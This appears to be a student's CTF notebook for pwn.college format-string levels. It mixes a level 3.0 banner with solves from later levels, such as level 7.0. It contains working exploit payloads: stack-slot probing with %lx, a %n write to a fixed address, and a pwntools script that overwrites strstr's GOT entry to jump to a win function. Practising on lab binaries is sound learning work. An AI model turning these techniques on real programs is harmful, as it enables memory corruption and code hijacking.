###
### Welcome to ./babyfmt_level3.0!
###

This challenge reads in some bytes, calls printf on that string, and allows you to perform
a format string attack. Through this series of challenges, you will become painfully familiar
with the concept of Format String Attacks!

This challenge allows you to make a 256-sized format string.

This challenge reads the flag into the .bss! Nice and easy; just read it out!

So, the flag is in the .bss. How are you going to get it?
One way to do it is to use %s in your format string. It will dereference a pointer
and print the string that the pointer is pointing to. This is perfect for leaking the
flag from the BSS!

But there's one problem... Unlike level 1, you don't have a pointer to the bss on the stack.
The solution? Write this address in as part of your format string, then use a positional %s (i.e.,
%X$s with the correct X) to use that address as the pointer. That way, you have full control of
the address!

In this case, the address you want is 0x404140. Remember to input it in little endian! To debug what
address your %s will dereference, you can replace 's' with 'x' and see what the address is
being interpreted at.

I will now read up to 256 bytes. Send your data!

format specifiers to keep in mind:

  • %s (string) =
  • %d (decimal)
  • %p (memory address/pointer value)
  • %x (hexadecimal integer)
  • %lx (long hexadecimal integer)

#finding correct padding + slot

started off with just 8 'A's, kept playing/messing with it, until eventually I landed on this:

payload = b'A'* 5
payload += b'B'* 8
payload += b''.join(f'.{i}=%{i}$lx'.encode() for i in range(12, 40))

#%n gimmick

so now all i've gotta do is write the value 0xb8 into the variable stored at 0x404150 (using %n). remember, unlike %x or %p, %n just writes the number of characters printed so far into an integer variable

the problem? we can't just do something like

target = b'0xb8'

because %n doesn't write whatever we want, it just writes the amount of characters printed. so the work around is to send 0xb8 in decimal form (which is just 184)

#solve

spec = b'%184c%32$n'
payload = spec.ljust(13, b'A') + p64(0x404150)

#ret2win approach + fail

so this challenge is evidently a bit harder, since we aren't given any addresses/values to write. the ROP hint is also interesting. after playing around with different inputs, i loaded it into ida & noticed a win function:

pseudocode for win:

{
  int v0; // eax

  puts(s: "You win! Here is your flag:");
  v0 = open(file: "/flag", oflag: 0);
  sendfile(out_fd: 1, in_fd: v0, offset: nullptr, count: 0x400u);
  exit(status: 0);
}

looks like it might be a ret2win style solve-- im thinking of just overwriting a GOT entry that's called after END and just pointing it to win. but before going for anything i ran checksec (challenge hints towards it), since PIE or full RELRO would just kill this approach im pretty sure:

#finding a suitable .got address

so usually i'd reverse this and find a .got entry for a function that gets called after my overwrite/payload lands, then overwrite that with the address of win (hence; ret2win). but i used my brain & realized something clever:

the program doesn't stop reading user input until you send "END" right (which would be after our payload)? which C function is used to detect a specific string? as far as i know, there are two:

  • strcmp: which doesn't make sense, since it checks if something matches EXACTLY
  • strstr: most likely candidate, since it just searches for first occurrences

but instead of guessing we can just check:

river@debian:~/Desktop/ctf/pwncollege/formatstrings/7.0$ readelf -r babyfmt_level7.0 | grep strstr
000000404088  001100000007 R_X86_64_JUMP_SLO 0000000000000000 strstr@GLIBC_2.2.5 + 0
river@debian:~/Desktop/ctf/pwncollege/formatstrings/7.0$ readelf -r babyfmt_level7.0 | grep strcmp

which settles it! we can overwrite the address of strstr to point to win instead & get our flag

#solve

from pwn import *

context.binary = elf = ELF('/challenge/babyfmt_level7.0')
p = process('/challenge/babyfmt_level7.0')

payload = fmtstr_payload(18, {elf.got['strstr']: elf.sym['win']})
p.send(payload)
p.recvrepeat(1.0)
p.sendline(b'END')

print(p.recvall(timeout=2).decode(errors='replace'))
